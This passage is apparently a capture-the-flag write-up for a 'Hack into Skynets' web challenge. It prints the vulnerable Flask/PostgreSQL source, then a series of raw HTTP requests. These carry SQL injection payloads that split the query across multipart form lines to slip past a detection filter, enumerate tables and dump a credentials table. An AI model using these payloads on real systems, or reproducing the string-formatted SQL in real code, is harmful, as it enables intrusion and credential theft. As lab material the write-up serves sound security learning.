+    <span class="hljs-keyword">if</span> flask.request.method == <span class="hljs-string">'GET'</span>:
+        <span class="hljs-keyword">return</span> flask.send_from_directory(<span class="hljs-string">''</span>, <span class="hljs-string">'index.html'</span>)
+    <span class="hljs-keyword">elif</span> flask.request.method == <span class="hljs-string">'POST'</span>:
+        kt = query_kill_time()
+        <span class="hljs-keyword">if</span> kt:
+            result = kt
+        <span class="hljs-keyword">else</span>:
+            result = <span class="hljs-string">''</span>
+        <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">'index.html'</span>, result=result)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>)
+
+...
+    
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query_kill_time</span><span class="hljs-params">()</span>:</span>
+    name = flask.request.form.get(<span class="hljs-string">'name'</span>, <span class="hljs-string">''</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+
+    sql = (<span class="hljs-string">"SELECT name, born"</span>
+           <span class="hljs-string">"  FROM target"</span>
+           <span class="hljs-string">"  WHERE age &gt; 0"</span>
+           <span class="hljs-string">"    AND name = '{}'"</span>).format(name)    <span class="hljs-comment"># &lt;-- This is controllable.</span>
+    nb = sql_exec(sql)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> nb:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'{}: {}'</span>.format(*nb[<span class="hljs-number">0</span>])
+</code></pre><p>Now we need to attack this query while bypassing the Skynet classifier.</p><p>Here’s one passing attempt.</p><h4 id="🚪-POST--HTTP11"><a class="anchor hidden-xs" href="#🚪-POST--HTTP11" title="🚪-POST--HTTP11"><i class="fa fa-link"></i></a>🚪 POST / HTTP/1.1</h4><p>Request sent to <code>http://47.242.21.212:8084</code>:</p><pre><code>POST / HTTP/1.1
+Host: 47.242.21.212:8084
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+Origin: http://47.242.21.212:8084
+Connection: close
+Referer: http://47.242.21.212:8084/
+Cookie: SessionId=9728bbc03e57ad2ee6e3679ba512db3d
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+name=' or (true)-- 
+</code></pre><p>Response received:</p><pre><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 316
+Server: Werkzeug/0.16.1 Python/3.8.10
+Date: Fri, 21 Jan 2022 20:07:45 GMT
+
+&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+  &lt;link rel="stylesheet" href="static/style.css"&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+  &lt;title&gt;Skynet Target List&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;div class="query"&gt;
+    
+      &lt;h1&gt;Kill before&lt;/h1&gt;
+      &lt;h1&gt;skynet: 1997-04-19 00:00:00&lt;/h1&gt;
+    
+  &lt;/div&gt;
+&lt;/body&gt;
+</code></pre><hr><p>The flag does not appear to be in this table when enumerating the killed targets.</p><h4 id="🚪-POST--HTTP111"><a class="anchor hidden-xs" href="#🚪-POST--HTTP111" title="🚪-POST--HTTP111"><i class="fa fa-link"></i></a>🚪 POST / HTTP/1.1</h4><p>Request sent to <code>http://47.242.21.212:8084</code>:</p><pre><code>POST / HTTP/1.1
+Host: 47.242.21.212:8084
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Origin: http://47.242.21.212:8084
+Connection: close
+Referer: http://47.242.21.212:8084/
+Cookie: SessionId=9728bbc03e57ad2ee6e3679ba512db3d
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+name=' or (true) limit (select 1) offset (select 2)-- 
+</code></pre><p>Response received:</p><pre><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 322
+Server: Werkzeug/0.16.1 Python/3.8.10
+Date: Fri, 21 Jan 2022 20:21:57 GMT
+
+&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+  &lt;link rel="stylesheet" href="static/style.css"&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+  &lt;title&gt;Skynet Target List&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;div class="query"&gt;
+    
+      &lt;h1&gt;Kill before&lt;/h1&gt;
+      &lt;h1&gt;sarah.connor: 1961-01-01 00:00:00&lt;/h1&gt;
+    
+  &lt;/div&gt;
+&lt;/body&gt;
+</code></pre><hr><p>The list of killed targets are:</p><ol start="0">
+<li>skynet: 1997-04-19 00:00:00</li>
+<li>john.connor: 1984-01-01 00:00:00</li>
+<li>sarah.connor: 1961-01-01 00:00:00</li>
+<li>T-800: 2027-04-01 00:00:00</li>
+<li>T-1000: 2028-04-01 00:00:00</li>
+<li>miles.dyson: 1958-12-21 00:00:00</li>
+<li>kyle.reese: 2005-06-29 00:00:00</li>
+<li>todd.voight: 2015-01-01 00:00:00</li>
+<li>enrique.salceda: 2015-01-01 00:00:00</li>
+<li>janelle.voight: 2015-01-01 00:00:00</li>
+<li>adam.silberman: 2015-01-01 00:00:00</li>
+<li>T-X: 2029-04-01 00:00:00</li>
+<li>kate.connor: 2013-01-02 00:00:00</li>
+</ol><p>Hence, we probably need to figure out a way to do union selects.</p><p>There is an incongruence in the way the filter sees the input and what’s processed by the form.</p><pre><code class="python hljs">    req = {
+        <span class="hljs-string">'method'</span>: flask.request.method,
+        <span class="hljs-string">'path'</span>: flask.request.full_path,
+        <span class="hljs-string">'host'</span>: flask.request.headers.get(<span class="hljs-string">'host'</span>),
+        <span class="hljs-string">'content_type'</span>: flask.request.headers.get(<span class="hljs-string">'content-type'</span>),
+        <span class="hljs-string">'useragent'</span>: flask.request.headers.get(<span class="hljs-string">'user-agent'</span>),
+        <span class="hljs-string">'referer'</span>: flask.request.headers.get(<span class="hljs-string">'referer'</span>),
+        <span class="hljs-string">'cookie'</span>: flask.request.headers.get(<span class="hljs-string">'cookie'</span>),
+        <span class="hljs-string">'body'</span>: str(flask.request.get_data()),
+    }
+
+...
+
+    name = flask.request.form.get(<span class="hljs-string">'name'</span>, <span class="hljs-string">''</span>)
+</code></pre><p>It also appears that the blackbox filter splits lines up by new lines to detect problematic strings.</p><p>We can use the <code>multipart/form-data</code> content type to split up our SQL.</p><h4 id="🚪-POST--HTTP112"><a class="anchor hidden-xs" href="#🚪-POST--HTTP112" title="🚪-POST--HTTP112"><i class="fa fa-link"></i></a>🚪 POST / HTTP/1.1</h4><p>Request sent to <code>http://47.242.21.212:8084</code>:</p><pre><code>POST / HTTP/1.1
+Host: 47.242.21.212:8084 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70vAUsg88tLi2ore
+Content-Length: 176
+Origin: http://47.242.21.212:8084
+Connection: close
+Referer: http://47.242.21.212:8084/
+Cookie: SessionId=9728bbc03e57ad2ee6e3679ba512db3d
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+------WebKitFormBoundary70vAUsg88tLi2ore
+Content-Disposition: form-data; name="name"
+
+' 
+union
+select 
+version(), 
+null; --
+------WebKitFormBoundary70vAUsg88tLi2ore--
+
+</code></pre><p>Response received:</p><pre><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 403
+Server: Werkzeug/0.16.1 Python/3.8.10
+Date: Fri, 21 Jan 2022 22:45:26 GMT
+
+&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+  &lt;link rel="stylesheet" href="static/style.css"&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+  &lt;title&gt;Skynet Target List&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;div class="query"&gt;
+    
+      &lt;h1&gt;Kill before&lt;/h1&gt;
+      &lt;h1&gt;PostgreSQL 13.5 on x86_64-pc-linux-musl, compiled by gcc (Alpine 10.3.1_git20211027) 10.3.1 20211027, 64-bit: None&lt;/h1&gt;
+    
+  &lt;/div&gt;
+&lt;/body&gt;
+</code></pre><hr><p>Getting the list of tables.</p><h4 id="🚪-POST--HTTP113"><a class="anchor hidden-xs" href="#🚪-POST--HTTP113" title="🚪-POST--HTTP113"><i class="fa fa-link"></i></a>🚪 POST / HTTP/1.1</h4><p>Request sent to <code>http://47.242.21.212:8084</code>:</p><pre><code>POST / HTTP/1.1
+Host: 47.242.21.212:8084 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70vAUsg88tLi2ore
+Content-Length: 261
+Origin: http://47.242.21.212:8084
+Connection: close
+Referer: http://47.242.21.212:8084/
+Cookie: SessionId=9728bbc03e57ad2ee6e3679ba512db3d
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+------WebKitFormBoundary70vAUsg88tLi2ore
+Content-Disposition: form-data; name="name"
+
+' 
+union
+select 
+string_agg(table_name, ', '), 
+null
+from information_schema.tables 
+where table_schema = 'public'
+; --
+------WebKitFormBoundary70vAUsg88tLi2ore--
+
+</code></pre><p>Response received:</p><pre><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 363
+Server: Werkzeug/0.16.1 Python/3.8.10
+Date: Fri, 21 Jan 2022 23:05:19 GMT
+
+&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+  &lt;link rel="stylesheet" href="static/style.css"&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+  &lt;title&gt;Skynet Target List&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;div class="query"&gt;
+    
+      &lt;h1&gt;Kill before&lt;/h1&gt;
+      &lt;h1&gt;target, target_credentials, login_session, passwd, cmd_exec, passwd1: None&lt;/h1&gt;
+    
+  &lt;/div&gt;
+&lt;/body&gt;
+</code></pre><hr><p>Listing the columns in the <code>target_credentials</code> table.</p><h4 id="🚪-POST--HTTP114"><a class="anchor hidden-xs" href="#🚪-POST--HTTP114" title="🚪-POST--HTTP114"><i class="fa fa-link"></i></a>🚪 POST / HTTP/1.1</h4><p>Request sent to <code>http://47.242.21.212:8084</code>:</p><pre><code>POST / HTTP/1.1
+Host: 47.242.21.212:8084 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70vAUsg88tLi2ore
+Content-Length: 301
+Origin: http://47.242.21.212:8084
+Connection: close
+Referer: http://47.242.21.212:8084/
+Cookie: SessionId=9728bbc03e57ad2ee6e3679ba512db3d
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+------WebKitFormBoundary70vAUsg88tLi2ore
+Content-Disposition: form-data; name="name"
+
+' 
+union
+select 
+string_agg(column_name, ', '), 
+null
+from information_schema.columns 
+where table_schema = 'public' and table_name = 'target_credentials'
+; --
+------WebKitFormBoundary70vAUsg88tLi2ore--
+
+</code></pre><p>Response received:</p><pre><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 340
+Server: Werkzeug/0.16.1 Python/3.8.10
+Date: Fri, 21 Jan 2022 23:05:33 GMT
+
+&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+  &lt;link rel="stylesheet" href="static/style.css"&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+  &lt;title&gt;Skynet Target List&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;div class="query"&gt;
+    
+      &lt;h1&gt;Kill before&lt;/h1&gt;
+      &lt;h1&gt;id, account, password, access_key, secret_key: None&lt;/h1&gt;
+    
+  &lt;/div&gt;
+&lt;/body&gt;
+</code></pre><hr><p>Listing the secret keys.</p><h2 id="🚪-POST--HTTP115"><a class="anchor hidden-xs" href="#🚪-POST--HTTP115" title="🚪-POST--HTTP115"><i class="fa fa-link"></i></a>🚪 POST / HTTP/1.1</h2><p>Request sent to <code>http://47.242.21.212:8084</code>:</p><pre><code>POST / HTTP/1.1
+Host: 47.242.21.212:8084 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70vAUsg88tLi2ore
+Content-Length: 222
+Origin: http://47.242.21.212:8084
+Connection: close
+Referer: http://47.242.21.212:8084/
+Cookie: SessionId=9728bbc03e57ad2ee6e3679ba512db3d
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+------WebKitFormBoundary70vAUsg88tLi2ore
+Content-Disposition: form-data; name="name"
+
+' 
+union
+select 
+string_agg(secret_key, ', '), 
+null
+from target_credentials
+; --
+------WebKitFormBoundary70vAUsg88tLi2ore--
+
+</code></pre><p>Response received:</p><pre><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 754
+Server: Werkzeug/0.16.1 Python/3.8.10
+Date: Fri, 21 Jan 2022 23:06:16 GMT
+
+&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+  &lt;link rel="stylesheet" href="static/style.css"&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1" /&gt;
+  &lt;title&gt;Skynet Target List&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;div class="query"&gt;
+    
+      &lt;h1&gt;Kill before&lt;/h1&gt;
+      &lt;h1&gt;rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937, 92ed3ec5e34b68ab2c3984a1b5474937: None&lt;/h1&gt;
+    
+  &lt;/div&gt;
+&lt;/body&gt;
+</code></pre><p>Flag: <code>rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}</code></p><h2 id="Server-Source-Code"><a class="anchor hidden-xs" href="#Server-Source-Code" title="Server-Source-Code"><i class="fa fa-link"></i></a>Server Source Code</h2><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python3</span>
+
+<span class="hljs-keyword">import</span> flask
+<span class="hljs-keyword">import</span> psycopg2
+<span class="hljs-keyword">import</span> datetime
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">from</span> skynet <span class="hljs-keyword">import</span> Skynet
+
+app = flask.Flask(__name__, static_url_path=<span class="hljs-string">''</span>)
+skynet = Skynet() <span class="hljs-comment"># Blackbox detection engine</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skynet_detect</span><span class="hljs-params">()</span>:</span>
+    req = {
+        <span class="hljs-string">'method'</span>: flask.request.method,
+        <span class="hljs-string">'path'</span>: flask.request.full_path,
+        <span class="hljs-string">'host'</span>: flask.request.headers.get(<span class="hljs-string">'host'</span>),
+        <span class="hljs-string">'content_type'</span>: flask.request.headers.get(<span class="hljs-string">'content-type'</span>),  
+        <span class="hljs-string">'useragent'</span>: flask.request.headers.get(<span class="hljs-string">'user-agent'</span>),
+        <span class="hljs-string">'referer'</span>: flask.request.headers.get(<span class="hljs-string">'referer'</span>),
+        <span class="hljs-string">'cookie'</span>: flask.request.headers.get(<span class="hljs-string">'cookie'</span>),
+        <span class="hljs-string">'body'</span>: str(flask.request.get_data()),
+    }
+    _, result = skynet.classify(req)
+    <span class="hljs-keyword">return</span> result <span class="hljs-keyword">and</span> result[<span class="hljs-string">'attack'</span>]
+
+<span class="hljs-meta">@app.route('/static/&lt;path:path&gt;')</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">static_files</span><span class="hljs-params">(path)</span>:</span>
+    <span class="hljs-keyword">return</span> flask.send_from_directory(<span class="hljs-string">'static'</span>, path)
+
+<span class="hljs-meta">@app.route('/', methods=['GET', 'POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_query</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">if</span> skynet_detect():
+        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>)
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> query_login_state():
+        response = flask.make_response(<span class="hljs-string">'No login, redirecting'</span>, <span class="hljs-number">302</span>)
+        response.location = flask.escape(<span class="hljs-string">'/login'</span>)
+        <span class="hljs-keyword">return</span> response
+
+    <span class="hljs-keyword">if</span> flask.request.method == <span class="hljs-string">'GET'</span>:
+        <span class="hljs-keyword">return</span> flask.send_from_directory(<span class="hljs-string">''</span>, <span class="hljs-string">'index.html'</span>)
+    <span class="hljs-keyword">elif</span> flask.request.method == <span class="hljs-string">'POST'</span>:
+        kt = query_kill_time()
+        <span class="hljs-keyword">if</span> kt:
+            result = kt 
+        <span class="hljs-keyword">else</span>:
+            result = <span class="hljs-string">''</span>
+        <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">'index.html'</span>, result=result)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>)
+
+<span class="hljs-meta">@app.route('/login', methods=['GET', 'POST'])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_login</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">if</span> skynet_detect():
+        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>)
+
+    <span class="hljs-keyword">if</span> flask.request.method == <span class="hljs-string">'GET'</span>:
+        <span class="hljs-keyword">return</span> flask.send_from_directory(<span class="hljs-string">'static'</span>, <span class="hljs-string">'login.html'</span>)
+    <span class="hljs-keyword">elif</span> flask.request.method == <span class="hljs-string">'POST'</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> query_login_attempt():
+            <span class="hljs-keyword">return</span> flask.send_from_directory(<span class="hljs-string">'static'</span>, <span class="hljs-string">'login.html'</span>)
+        <span class="hljs-keyword">else</span>:
+            session = create_session()
+            response = flask.make_response(<span class="hljs-string">'Login success'</span>, <span class="hljs-number">302</span>)
+            response.set_cookie(<span class="hljs-string">'SessionId'</span>, session)
+            response.location = flask.escape(<span class="hljs-string">'/'</span>)
+            <span class="hljs-keyword">return</span> response
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query_login_state</span><span class="hljs-params">()</span>:</span>
+    sid = flask.request.cookies.get(<span class="hljs-string">'SessionId'</span>, <span class="hljs-string">''</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sid:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+    now = datetime.datetime.now()
+    <span class="hljs-keyword">with</span> psycopg2.connect(
+            host=<span class="hljs-string">"challenge-db"</span>,
+            database=<span class="hljs-string">"ctf"</span>,
+            user=<span class="hljs-string">"ctf"</span>,
+            password=<span class="hljs-string">"ctf"</span>) <span class="hljs-keyword">as</span> conn:
+        cursor = conn.cursor()
+        cursor.execute(<span class="hljs-string">"SELECT sessionid"</span>
+           <span class="hljs-string">"  FROM login_session"</span>
+           <span class="hljs-string">"  WHERE sessionid = %s"</span>
+           <span class="hljs-string">"    AND valid_since &lt;= %s"</span>
+           <span class="hljs-string">"    AND valid_until &gt;= %s"</span>
+           <span class="hljs-string">""</span>, (sid, now, now))
+        data = [r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> cursor.fetchall()]
+        <span class="hljs-keyword">return</span> bool(data)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query_login_attempt</span><span class="hljs-params">()</span>:</span>
+    username = flask.request.form.get(<span class="hljs-string">'username'</span>, <span class="hljs-string">''</span>)
+    password = flask.request.form.get(<span class="hljs-string">'password'</span>, <span class="hljs-string">''</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> password:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+
+    sql = (<span class="hljs-string">"SELECT id, account"</span>
+           <span class="hljs-string">"  FROM target_credentials"</span>
+           <span class="hljs-string">"  WHERE password = '{}'"</span>).format(hashlib.md5(password.encode()).hexdigest())
+    user = sql_exec(sql)
+    name = user[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> user[<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> user[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> <span class="hljs-string">''</span>
+    <span class="hljs-keyword">return</span> name == username
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_session</span><span class="hljs-params">()</span>:</span>
+    valid_since = datetime.datetime.now()
+    valid_until = datetime.datetime.now() + datetime.timedelta(days=<span class="hljs-number">1</span>)
+    sessionid = hashlib.md5((str(valid_since)+str(valid_until)+str(datetime.datetime.now())).encode()).hexdigest()
+
+    sql_exec_update((<span class="hljs-string">"INSERT INTO login_session (sessionid, valid_since, valid_until)"</span>
+           <span class="hljs-string">"  VALUES ('{}', '{}', '{}')"</span>).format(sessionid, valid_since, valid_until))
+    <span class="hljs-keyword">return</span> sessionid
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query_kill_time</span><span class="hljs-params">()</span>:</span>
+    name = flask.request.form.get(<span class="hljs-string">'name'</span>, <span class="hljs-string">''</span>)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+
+    sql = (<span class="hljs-string">"SELECT name, born"</span>
+           <span class="hljs-string">"  FROM target"</span>
+           <span class="hljs-string">"  WHERE age &gt; 0"</span>
+           <span class="hljs-string">"    AND name = '{}'"</span>).format(name)
+    nb = sql_exec(sql)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> nb:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'{}: {}'</span>.format(*nb[<span class="hljs-number">0</span>])
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sql_exec</span><span class="hljs-params">(stmt)</span>:</span>
+    data = list()
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">with</span> psycopg2.connect(
+                host=<span class="hljs-string">"challenge-db"</span>,
+                database=<span class="hljs-string">"ctf"</span>,
+                user=<span class="hljs-string">"ctf"</span>,
+                password=<span class="hljs-string">"ctf"</span>) <span class="hljs-keyword">as</span> conn:
+            cursor = conn.cursor()
+            cursor.execute(stmt)
+            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cursor.fetchall():
+                data.append([col <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> row])
+            cursor.close()
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        print(e)
+    <span class="hljs-keyword">return</span> data
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sql_exec_update</span><span class="hljs-params">(stmt)</span>:</span>
+    data = list()
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">with</span> psycopg2.connect(
+                host=<span class="hljs-string">"challenge-db"</span>,
+                database=<span class="hljs-string">"ctf"</span>,
+                user=<span class="hljs-string">"ctf"</span>,
+                password=<span class="hljs-string">"ctf"</span>) <span class="hljs-keyword">as</span> conn:
+            cursor = conn.cursor()
+            cursor.execute(stmt)
+            conn.commit()
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        print(e)
+    <span class="hljs-keyword">return</span> data
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8080</span>)
+
+</code></pre></div>
+    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
+        <div class="pull-right dropdown">
+            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
+                <i class="fa fa-bars"></i>
+            </a>
+            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
+                <div class="toc"><ul class="nav">
+<li class=""><a href="#Hack-into-Skynets" title="Hack into Skynets">Hack into Skynets</a><ul class="nav">
+<li><a href="#Notes" title="Notes:">Notes:</a><ul class="nav">
+<li><a href="#🚪-POST-login-HTTP11" title="🚪 POST /login HTTP/1.1">🚪 POST /login HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP11" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP111" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP112" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP113" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP114" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+</ul>
+</li>
+<li><a href="#🚪-POST--HTTP115" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#Server-Source-Code" title="Server Source Code">Server Source Code</a></li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+            </ul>
+        </div>
+    </div>
+    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;"  >
+        <div class="toc"><ul class="nav">
+<li class=""><a href="#Hack-into-Skynets" title="Hack into Skynets">Hack into Skynets</a><ul class="nav">
+<li><a href="#Notes" title="Notes:">Notes:</a><ul class="nav">
+<li><a href="#🚪-POST-login-HTTP11" title="🚪 POST /login HTTP/1.1">🚪 POST /login HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP11" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP111" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP112" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP113" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#🚪-POST--HTTP114" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+</ul>
+</li>
+<li><a href="#🚪-POST--HTTP115" title="🚪 POST / HTTP/1.1">🚪 POST / HTTP/1.1</a></li>
+<li><a href="#Server-Source-Code" title="Server Source Code">Server Source Code</a></li>
+</ul>
+</li>
+</ul>
+</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
